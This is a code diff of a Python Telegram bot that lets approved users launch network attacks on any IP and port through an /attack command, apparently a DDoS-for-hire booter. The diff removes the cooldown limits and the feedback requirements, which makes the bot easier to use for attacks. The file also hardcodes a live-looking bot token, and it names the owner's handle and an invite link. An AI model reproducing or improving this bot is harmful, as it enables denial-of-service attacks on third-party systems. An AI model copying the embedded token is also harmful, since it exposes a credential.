@@ -1,15 +1,11 @@
 import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
-import time
 
 TELEGRAM_BOT_TOKEN = '8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs'
 ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
 attack_in_progress = False
-user_cooldowns = {}  # Store user cooldowns (last attack time)
-user_feedback_status = {}  # Store feedback status for each user
-first_attack_feedback_submitted = {}  # Track if feedback is submitted for the first attack
 
 # Load approved IDs (users and groups) from file
 def load_approved_ids():
@@ -87,31 +83,14 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     if attack_in_progress:
-        cooldown_remaining = get_cooldown_remaining(user_id)
-        if cooldown_remaining > 0:
-            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You have {cooldown_remaining} seconds remaining before you can attack again.*", parse_mode='Markdown')
-            return
-        else:
-            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait 3 to 5 minutes for the next attack.*", parse_mode='Markdown')
-            return
+        await context.bot.send_message(chat_id=chat_id, text="* Please wait 3 to 5 minutes for the next attack.*", parse_mode='Markdown')
+        return
 
     if len(args) != 3:
         await context.bot.send_message(chat_id=chat_id, text="*  example » /attack ip port time*", parse_mode='Markdown')
         return
 
     ip, port, time = args
-    
-    # Check if the user has exceeded the cooldown period
-    cooldown_remaining = get_cooldown_remaining(user_id)
-    if cooldown_remaining > 0:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You have {cooldown_remaining} seconds remaining before you can attack again.*", parse_mode='Markdown')
-        return
-
-    # Check if feedback is submitted based on the attack count
-    if not first_attack_feedback_submitted.get(user_id, False):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please submit screenshot feedback for your previous attack before launching another one.*", parse_mode='Markdown')
-        return
-
     await context.bot.send_message(chat_id=chat_id, text=(
         f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
         f"*⭐ Target » {ip}*\n"
@@ -120,10 +99,10 @@ async def attack(update: Update, context: CallbackContext):
         f"*https://t.me/+03wLVBPurPk2NWRl*\n"
     ), parse_mode='Markdown')
 
-    asyncio.create_task(run_attack(chat_id, ip, port, time, context, user_id))
+    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
 
 # Run attack function
-async def run_attack(chat_id, ip, port, time, context, user_id):
+async def run_attack(chat_id, ip, port, time, context):
     global attack_in_progress
     attack_in_progress = True
 
@@ -145,43 +124,7 @@ async def run_attack(chat_id, ip, port, time, context, user_id):
 
     finally:
         attack_in_progress = False
-        # Set the cooldown for the user
-        set_cooldown(user_id, int(time))
-        if not first_attack_feedback_submitted.get(user_id, False):
-            first_attack_feedback_submitted[user_id] = True
-            await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')
-        else:
-            await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*", parse_mode='Markdown')
-
-# Function to get remaining cooldown time
-def get_cooldown_remaining(user_id):
-    last_attack_time = user_cooldowns.get(user_id)
-    if last_attack_time:
-        cooldown_remaining = last_attack_time + 180 - time.time()
-        if cooldown_remaining > 0:
-            return cooldown_remaining
-    return 0
-
-# Function to set cooldown for a user
-def set_cooldown(user_id, cooldown_time):
-    user_cooldowns[user_id] = time.time()
-
-# Function to check if feedback is submitted
-def is_feedback_submitted(user_id):
-    return user_feedback_status.get(user_id, False)
-
-# Function to mark feedback as submitted
-def mark_feedback_submitted(user_id):
-    user_feedback_status[user_id] = True
-
-# Function to handle feedback submission (you'll need to implement this)
-async def handle_feedback_submission(update: Update, context: CallbackContext):
-    user_id = str(update.effective_user.id)
-    # Process the feedback (e.g., check if it's a valid screenshot)
-    # ...
-    # Mark feedback as submitted
-    mark_feedback_submitted(user_id)
-    await context.bot.send_message(chat_id=update.effective_chat.id, text="*✅ Feedback received. You can now launch another attack.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')
 
 # Main function
 def main():
@@ -190,9 +133,8 @@ def main():
     application.add_handler(CommandHandler("approve", approve))
     application.add_handler(CommandHandler("remove", remove))
     application.add_handler(CommandHandler("attack", attack))
-    # Add a handler for feedback submission (e.g., a command or a message handler)
-    # application.add_handler(CommandHandler("feedback", handle_feedback_submission))
     application.run_polling()
 
 if __name__ == '__main__':
     main()
+    
